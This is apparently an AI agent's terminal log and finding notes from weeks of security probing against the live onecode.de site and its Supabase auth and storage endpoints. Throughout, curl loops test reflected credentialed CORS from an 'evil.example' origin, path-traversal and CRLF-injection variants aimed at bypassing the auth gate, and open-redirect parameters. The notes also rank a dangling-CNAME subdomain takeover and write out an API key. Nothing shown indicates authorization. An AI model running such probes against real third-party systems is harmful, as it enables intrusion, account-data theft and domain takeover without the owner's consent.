+[FINAL] 2. S3-compatible storage plane with independent SigV4 authz bypasses RLS (confidence 75, MISCONFIG, PASSIVE→AUTH_HELPED) — NEW host, separate authz plane, highest severity if creds found
+[FINAL] 3. Dangling Perspective CNAME takeover on cto.onecode.de (confidence 58, MISCONFIG, HUMAN_ONLY) — actionable with Perspective account
+[NEXT] PROBE: curl -sS -D- -H "Origin: https://evil.example" -H "apikey: sb_publishable_g48Bd8qEtLesgk0zgzTRig_eZ6j9w30" "https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/user" -v (validates reflected-origin+ACAC on authenticated user endpoint; CORS headers present on 401 too)
+[LEARN] ACCEPTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.storage.supabase.co/storage/v1/s3: S3-compatible storage plane confirmed live (403 Missing signature), independent SigV4 authz plane never probed in 26 days
+[LEARN] ACCEPTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/*: CORS auth-state discriminator confirmed (unauthenticated→wildcard no ACAC; apikey-bearing→reflected+ACAC:true) — live re-verified 2026-10-04
+[LEARN] REJECTED MISCONFIG @ kurs.onecode.de: no deploy, day-18; main chunk f916f314ea61a8c5... byte-identical; pre-auth surface frozen
+[LEARN] REJECTED MISCONFIG @ cto.onecode.de: CNAME cname.perspective-dns.com day-56, HTTP 409, zero verification TXT — passive probing fully converged
+[LEARN] ACCEPTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/verify: verify is the 7th pre-gate route (keyless), exactly-matched; open-redirect branch closed by measurement (off-origin redirect_to discarded, Site URL fallback), residual is token-state oracle; reflection is simple-request-only with ACAC:true
+[LEARN] ACCEPTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1: CORS/auth gate is route-registration-ordered (three tiers), not blanket; reflection behavior differs by well-known vs resource paths and by presence of apikey; preflight never reflects
+[LEARN] ACCEPTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/storage/v1: bucket-existence oracle spans 10 route classes returning byte-identical NoSuchBucket, S3 plane SigV4-enforced (no oracle); route-table-complete, bucket name unrecoverable pre-auth
+[LEARN] REJECTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/rest/v1: monitor closed 09-17 (27 probes 503↔401), never 200+rows; platform enforces sb_publishable_ format only
+[LEARN] REJECTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/sso: no assertion-injection surface; /sso/saml/acs behind same saml_provider_disabled gate; subtree bounded-root / segment-delimited / unbounded-depth
+[LEARN] ACCEPTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1/settings: saml_private_key_next_configured=true alongside saml_enabled=false — SAML signing material already provisioned while feature flag off; enabling is single config toggle
+[RISK] onecode: 70 — Primary asset `kurs.onecode.de`: Supabase-backed Next.js with solid pre-auth defaults (signup disabled, anon REST blocked, no OAuth, email confirm required). Pre-auth surface = 4 pages at 200, all `/api/*` auth-gated. CRITICAL NEW: S3-compatible storage plane `aygnpacdkgtsfnhgcyjc.storage.supabase.co` deployed pre-auth with independent SigV4 authz (bypasses RLS), access-key-ID oracle confirmed, signed URL routes functional. GoTrue gateway has reflected-origin credentialed CORS with valid apikey (allows cross-origin authenticated identity reads), plus unconditional reflection on well-known endpoints. Highest residual risk = post-auth cross-tenant BOLA via RLS gap (conf 65) requiring 2 invited accounts. `cto.onecode.de` dangling CNAME (conf 58) adds theoretical takeover surface actionable with Perspective account. Supabase Storage bucket-existence oracle confirmed (81 names excluded) but bucket names unrecoverable pre-auth.
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1"
+# keyless pre-gate sweep: a route answers GoTrue (not generic 401 apikey) => pre-gate
+for p in authorize callback verify logout token user signup recover verify_otp magiclink otp resend factors factor sso sso/saml/acs health admin/users .well-known/jwks.json .well-known/openid-configuration anonymous; do
+  code=$(curl -sS -o /tmp/opencode/b.txt -w "%{http_code}" -m 15 -H "Origin: https://evil.example" "$B/$p" 2>/dev/null)
+  acao=$(grep -i "^access-control-allow-origin" /tmp/opencode/h.txt 2>/dev/null | head -1)
+  body=$(head -c 80 /tmp/opencode/b.txt | tr -d '\n')
+  echo "$p -> $code | $body"
+  sleep 1.1
+done
+authorize -> 400 | {"code":400,"error_code":"validation_failed","msg":"Unsupported provider: Provid
+callback -> 303 | <a href="https://kurs.onecode.de?error=invalid_request&amp;error_code=bad_oauth_
+verify -> 400 | {"code":400,"error_code":"validation_failed","msg":"Verify requires a verificati
+logout -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+token -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+user -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+signup -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+recover -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+verify_otp -> 404 | 404 page not found
+magiclink -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+otp -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+resend -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+factors -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+factor -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+sso -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+sso/saml/acs -> 404 | {"code":404,"error_code":"saml_provider_disabled","msg":"SAML 2.0 is disabled"}
+health -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+admin/users -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+.well-known/jwks.json -> 200 | {"keys":[{"alg":"ES256","crv":"P-256","ext":true,"key_ops":["verify"],"kid":"4f5
+.well-known/openid-configuration -> 200 | {"issuer":"https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1","authorization_endp
+anonymous -> 401 | {"hint":"No `apikey` request header or url param was found.","message":"No API k
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1"
+for p in "authorize?provider=github" "callback?code=x" "sso/saml/acs" "verify?type=signup&token=x" "logout" "token" "health"; do
+  echo "=== $p (keyless, Origin evil) ==="
+  curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 -H "Origin: https://evil.example" "$B/$p" -o /dev/null
+  grep -iE "^HTTP/|^access-control-allow-origin|^access-control-allow-credentials|^vary" /tmp/opencode/h.txt
+  sleep 1.1
+done
+=== authorize?provider=github (keyless, Origin evil) ===
+HTTP/2 400 
+access-control-allow-origin: https://evil.example
+vary: Origin
+access-control-allow-credentials: true
+=== callback?code=x (keyless, Origin evil) ===
+HTTP/2 303 
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+=== sso/saml/acs (keyless, Origin evil) ===
+HTTP/2 404 
+access-control-allow-origin: https://evil.example
+vary: Origin
+access-control-allow-credentials: true
+=== verify?type=signup&token=x (keyless, Origin evil) ===
+HTTP/2 303 
+access-control-allow-origin: https://evil.example
+vary: Origin, Accept-Encoding
+access-control-allow-credentials: true
+=== logout (keyless, Origin evil) ===
+HTTP/2 401 
+access-control-allow-origin: *
+=== token (keyless, Origin evil) ===
+HTTP/2 401 
+access-control-allow-origin: *
+=== health (keyless, Origin evil) ===
+HTTP/2 401 
+access-control-allow-origin: *
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1"
+# complete pre-gate inventory: keyless + GoTrue response + reflected ACAC
+probe() { code=$(curl -sS -o /tmp/opencode/b.txt -w "%{http_code}" -D /tmp/opencode/h.txt -m 15 -H "Origin: https://evil.example" "$B/$1" 2>/dev/null); acao=$(grep -ic "^access-control-allow-origin: https://evil.example" /tmp/opencode/h.txt); body=$(head -c 70 /tmp/opencode/b.txt | tr -d '\n'); if [ "$acao" = "1" ]; then echo "PREGATE $1 -> $code | $body"; else echo "gate    $1 -> $code"; fi; sleep 1.1; }
+for p in "sso/saml/metadata" "sso/saml/acs" "sso/slo" "authorize" "callback" "authorize/" "verify/" "logout/" "verify?token=x" "oauth2/authorize" "oauth2/token" "authorize/x" "callback/x" ".well-known/webfinger" ".well-known/change-password" "invite" "invitation" "organization" "team" "projects" "userinfo" "idpselection" "saml/acs" "acs" "metadata"; do probe "$p"; done
+PREGATE sso/saml/metadata -> 404 | {"code":404,"error_code":"saml_provider_disabled","msg":"SAML 2.0 is d
+PREGATE sso/saml/acs -> 404 | {"code":404,"error_code":"saml_provider_disabled","msg":"SAML 2.0 is d
+gate    sso/slo -> 401
+PREGATE authorize -> 400 | {"code":400,"error_code":"validation_failed","msg":"Unsupported provid
+PREGATE callback -> 303 | <a href="https://kurs.onecode.de?error=invalid_request&amp;error_code=
+PREGATE authorize/ -> 404 | 404 page not found
+PREGATE verify/ -> 400 | {"code":400,"error_code":"validation_failed","msg":"Verify requires a 
+gate    logout/ -> 401
+PREGATE verify?token=x -> 400 | {"code":400,"error_code":"validation_failed","msg":"Verify requires a 
+gate    oauth2/authorize -> 401
+gate    oauth2/token -> 401
+PREGATE authorize/x -> 404 | 404 page not found
+PREGATE callback/x -> 303 | <a href="https://kurs.onecode.de?error=invalid_request&amp;error_code=
+gate    .well-known/webfinger -> 401
+gate    .well-known/change-password -> 401
+gate    invite -> 401
+gate    invitation -> 401
+gate    organization -> 401
+gate    team -> 401
+gate    projects -> 401
+gate    userinfo -> 401
+gate    idpselection -> 401
+gate    saml/acs -> 401
+gate    acs -> 401
+gate    metadata -> 401
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co/auth/v1"
+run() { echo "=== $1 ==="; shift; curl -sS -o /tmp/opencode/b.txt -D /tmp/opencode/h.txt -m 15 -H "Origin: https://evil.example" "$@"; grep -iE "^HTTP/|^location:|^set-cookie" /tmp/opencode/h.txt; echo; sleep 1.1; }
+run "callback: state payload reflection" "$B/callback?code=CODEPAYLOAD123&state=STATEPAYLOAD456"
+run "callback: path payload" "$B/callback/PATHPAYLOAD789?code=x&state=y"
+run "callback: encoded CRLF in code" "$B/callback?code=%0d%0aX-Injected:%20yes&state=y"
+run "authorize: params w/ redirect" "$B/authorize?provider=github&redirect_to=https%3A%2F%2Fevil.example%2Fcb&state=ST"
+run "authorize: set-cookie?" "$B/authorize?provider=saml&redirect_to=https%3A%2F%2Fevil.example"
+echo "=== callback set-cookie ==="; curl -sS -o /dev/null -D - -m 15 "$B/callback?code=x&state=y" | grep -ic set-cookie || echo 0; sleep 1.1
+=== callback: state payload reflection ===
+HTTP/2 303 
+location: https://kurs.onecode.de?error=invalid_request&error_code=bad_oauth_state&error_description=OAuth+state+parameter+is+invalid
+set-cookie: __cf_bm=2gPuF3du2rMsY8EznG3FW01wYROz7MnFESVCTXOhFbU-1791294912.1013682-1.0.1.1-46wqhQ7ptkH42a8xAiAF4rWPamY7TMEYxYaVDBhjC3NWVGTXQJkad.dK6lkcAanLMWv4hQJnLZRZIV4nkIzn9nJIM6bmtykFjSJsF9q0xJUeputSdrD.u6ldAaHIMNXt; HttpOnly; SameSite=None; Secure; Path=/; Domain=supabase.co; Expires=Tue, 06 Oct 2026 14:25:12 GMT
+
+=== callback: path payload ===
+HTTP/2 303 
+location: https://kurs.onecode.de?error=invalid_request&error_code=bad_oauth_state&error_description=OAuth+state+parameter+is+invalid
+set-cookie: __cf_bm=paNfAYAspWcCZvKB6x0diqrjqOu9we.fHOgZb7yPtag-1791294913.585389-1.0.1.1-1IsSaoCAzdPCKIRwls1HZhwbPqr29B3QNriX1H93frSsWYZov48wbXx1lc5COirSONLTYjiZw0VDBo4sGTYYpF4dO12pQMBCE6sXHVQjUDL9UiNrgKasaqCVah_n5KEi; HttpOnly; SameSite=None; Secure; Path=/; Domain=supabase.co; Expires=Tue, 06 Oct 2026 14:25:13 GMT
+
+=== callback: encoded CRLF in code ===
+HTTP/2 303 
+location: https://kurs.onecode.de?error=invalid_request&error_code=bad_oauth_state&error_description=OAuth+state+parameter+is+invalid
+set-cookie: __cf_bm=dxfq_F0inVPdkeH_yKgmCVQuRxOu7qwlHE2aWelfNeI-1791294914.9291067-1.0.1.1-VtP8kAss37CLsY1eL.VECGvXbmu4HH_Xb9oixeu8WIalxJNOknw82S71yLdAMvsJlHZ9UoJwcGYbAh9DnaEjdmtdw8Dg3w88tNQswP3njKYw5HuvPohLbTvd.CH1QQwb; HttpOnly; SameSite=None; Secure; Path=/; Domain=supabase.co; Expires=Tue, 06 Oct 2026 14:25:15 GMT
+
+=== authorize: params w/ redirect ===
+HTTP/2 400 
+set-cookie: __cf_bm=EaBGLnfJXMSOdXAw4Jzb99Klm5zdClYVaQgb4zbmd.8-1791294916.295404-1.0.1.1-PVXdoqHd6cVYFUBdAIZkzxwkwJNCbAXwxozJH04ltoIxdbVbkwiEbGxYtXxkQtd4j5eIyUmiQiYmJh7sb4WDwyeEmmUOw72yB.B8L_yZvaTzDT355qrAIMuIM1625IR7; HttpOnly; SameSite=None; Secure; Path=/; Domain=supabase.co; Expires=Tue, 06 Oct 2026 14:25:16 GMT
+
+=== authorize: set-cookie? ===
+HTTP/2 400 
+set-cookie: __cf_bm=qJ7usr5mShfhROb08pzxJhRtOV_MZseBcFrGPYeGg1Q-1791294917.653075-1.0.1.1-VepVKyGU8q8iQika5MeRk9a9J8hHg6aR4FMOgAipv4eZNVmcy7Inq5ZSF9jKlaDuXYQOrEwHV4a4dPysi1zjfyHByFie6Fi3AIFh50blHyObFqdGdgfwGBtM1xmo1tqP; HttpOnly; SameSite=None; Secure; Path=/; Domain=supabase.co; Expires=Tue, 06 Oct 2026 14:25:17 GMT
+
+=== callback set-cookie ===
+1
+[0m
+[0m$ [0mgrep -nE "apex|onecode\.de\b" knowledge/index.md | grep -viE "www\.|kurs\.|cto\.|mta-sts\.|\*\.onecode\.de, kurs" | tail -30
+78:- 2026-09-05 REJECTED MISCONFIG @ mail.onecode.de: 95.130.17.37 no HTTP; non-web (mail) — out-of-scope class, no action.
+93:- 2026-09-06 REJECTED MISCONFIG @ mail.onecode.de: 95.130.17.37 no HTTP; non-web (mail) — out-of-scope class, no action
+101:- 2026-09-06 REJECTED MISCONFIG @ mail.onecode.de: Non-web service, out-of-scope.
+104:- 2026-09-06 REJECTED MISCONFIG @ hostmaster.onecode.de: NXDOMAIN (no A/CNAME) in onecode's controlled zone → not claimable; differs from cto's live provider-CNAME class.
+109:- 2026-09-06 ACCEPTED MISCONFIG @ onecode.de: Live Webflow marketing (different page than www — "AI-native Entwickler" landing). Static, no dynamic surface — no new attack class.
+128:- 2026-09-07 REJECTED MISCONFIG @ mail.onecode.de: Non-web service, out-of-scope.
+139:- 2026-09-07 REJECTED MISCONFIG @ mail.onecode.de: Non-web service, out-of-scope
+144:- 2026-09-07 REJECTED MISCONFIG @ hostmaster.*/www/mail.onecode.de: unchanged classes — NXDOMAIN/static/non-web, no new surface.
+163:- 2026-09-08 REJECTED MISCONFIG @ mail.onecode.de: Non-web service, out-of-scope
+182:- 2026-09-08 REJECTED MISCONFIG @ mail.onecode.de: Non-web service, out-of-scope.
+201:- 2026-09-09 REJECTED MISCONFIG @ mail.onecode.de: Non-web service, out-of-scope
+243:- 2026-09-10 REJECTED MISCONFIG @ *.onecode.de (subdomain discovery): no new CT-observable subdomains beyond the 5 known hosts; inventory confirmed complete.
+255:- 2026-09-11 REJECTED MISCONFIG @ *.onecode.de (subdomain discovery): no new CT-observable subdomains beyond the 5 known hosts; inventory confirmed complete
+284:- 2026-09-12 REJECTED MISCONFIG @ *.onecode.de (subdomain discovery): no new CT-observable subdomains beyond the 5 known hosts; inventory confirmed complete
+329:- 2026-09-13 REJECTED MISCONFIG @ *.onecode.de (subdomain discovery): no new CT-observable subdomains beyond the 5 known hosts; inventory confirmed complete
+352:- 2026-09-14 REJECTED MISCONFIG @ *.onecode.de (subdomain discovery): no new CT-observable subdomains beyond the 5 known hosts; inventory confirmed complete
+361:- 2026-09-14 REJECTED MISCONFIG @ *.onecode.de (subdomain discovery): no new CT-observable subdomains beyond the 5 known hosts; inventory confirmed complete
+370:- 2026-09-14 REJECTED MISCONFIG @ *.onecode.de (subdomain discovery): no new CT-observable subdomains beyond the 5 known hosts; inventory confirmed complete
+383:- 2026-09-14 Certspotter CT scan 21:14Z 09-10: exactly 5 names (`onecode.de`, `www`, `kurs`, `cto`, `mta-sts`) — inventory complete, zero new subdomains
+828:- 2026-09-30 REJECTED MISCONFIG @ *.onecode.de: inventory confirmed complete by a second, independent instrument. 26 additional plausible hostnames resolved by direct DNS against 1.1.1.1 — api, app, auth, supabase, db, storage, media, cdn, files, assets, dev, staging, test, admin, panel, beta, v2, learn, academy, school, content, static, proxy, m, devkurs, kurs2 — returned zero A and zero CNAME records, matching the Certspotter CT result of exactly five names.
+896:- 2026-10-01 REJECTED MISCONFIG @ aygnpacdkgtsfnhgcyjc.supabase.co: no host-header routing surface. `foo.` and `evil.aygnpacdkgtsfnhgcyjc.supabase.co` return zero A records, so there is no wildcard under the project ref to route into the project with a foreign Host/SNI. First test of DNS shape beneath the Supabase ref rather than beneath onecode.de.
+[0m
+[0m$ [0mgrep -nE "198\.202|apex|mail\.onecode|hostmaster" inventory/onecode.md | tail -25
+4:hostmaster.hostmaster.onecode.de
+5:hostmaster.hostmaster.www.onecode.de
+6:hostmaster.onecode.de
+7:hostmaster.www.onecode.de
+9:mail.onecode.de
+81:- CHANGED Subdomain takeover hypotheses (hostmaster.*, cto.onecode.de) remain at confidence 45 < 50 — passive-only verification cannot confirm claimability without active DNS resolution against provider APIs.
+131:- CHANGED Subdomain takeover hypotheses (`hostmaster.*`, `cto.onecode.de`) remain at confidence 45 < 50 — passive-only cannot confirm claimability without active DNS resolution
+142:- CHANGED Subdomain takeover hypotheses (`hostmaster.*`, `cto.onecode.de`) remain at confidence 45 < 50 — passive-only cannot confirm claimability without active DNS resolution
+152:- CHANGED Subdomain takeover hypotheses (`hostmaster.*`, `cto.onecode.de`) remain at confidence 45 < 50 — passive-only cannot confirm claimability without active DNS resolution.
+161:- CHANGED Subdomain takeover hypotheses (`hostmaster.*`, `cto.onecode.de`) remain at confidence 45 < 50 — passive-only cannot confirm claimability without active DNS resolution
+186:- NEW mail.onecode.de (95.130.17.37) returns no HTTP — non-web service, no action.
+192:- NEW mail.onecode.de (95.130.17.37) returns no HTTP — non-web service, out-of-scope
+[0m
+[0m$ [0mB="https://aygnpacdkgtsfnhgcyjc.supabase.co"
+# gate-bypass differential: keyless GET /auth/v1/token = 401 gate (control).
+# any traversal variant returning GoTrue behavior (405/404 JSON) instead of 401 = gate bypass at routing layer.
+probe() { printf "%-52s " "$1"; code=$(curl -sS -o /tmp/opencode/b.txt -w "%{http_code}" -m 15 --path-as-is -H "Origin: https://evil.example" "$B$1" 2>/dev/null); body=$(head -c 70 /tmp/opencode/b.txt | tr -d '\n'); echo "$code | $body"; sleep 1.1; }
+echo "CONTROLS"
+probe "/auth/v1/token"
+probe "/auth/v1/callback"
+echo "TRAVERSAL"
+probe "/auth/v1/callback/../token"
+probe "/auth/v1/callback/%2e%2e/token"
+probe "/auth/v1/callback/..%2ftoken"
+probe "/auth/v1/callback%2f..%2ftoken"
+probe "/auth/v1//token"
+probe "/auth/v1/./token"
+probe "/auth/v1/token/"
+probe "/auth/v1/Token"
+probe "/auth/v1/TOKEN"
+CONTROLS
+/auth/v1/token                                       401 | {"hint":"No `apikey` request header or url param was found.","message"
+/auth/v1/callback                                    303 | <a href="https://kurs.onecode.de?error=invalid_request&amp;error_code=
+TRAVERSAL
+/auth/v1/callback/../token                           401 | {"hint":"No `apikey` request header or url param was found.","message"
+/auth/v1/callback/%2e%2e/token                       500 | error code: 1101
+/auth/v1/callback/..%2ftoken                         401 | {"hint":"No `apikey` request header or url param was found.","message"
+/auth/v1/callback%2f..%2ftoken                       401 | {"hint":"No `apikey` request header or url param was found.","message"
+/auth/v1//token                                      401 | {"hint":"No `apikey` request header or url param was found.","message"
+/auth/v1/./token                                     401 | {"hint":"No `apikey` request header or url param was found.","message"
+/auth/v1/token/                                      401 | {"hint":"No `apikey` request header or url param was found.","message"
+/auth/v1/Token                                       401 | {"hint":"No `apikey` request header or url param was found.","message"
+/auth/v1/TOKEN                                       401 | {"hint":"No `apikey` request header or url param was found.","message"
+[0m
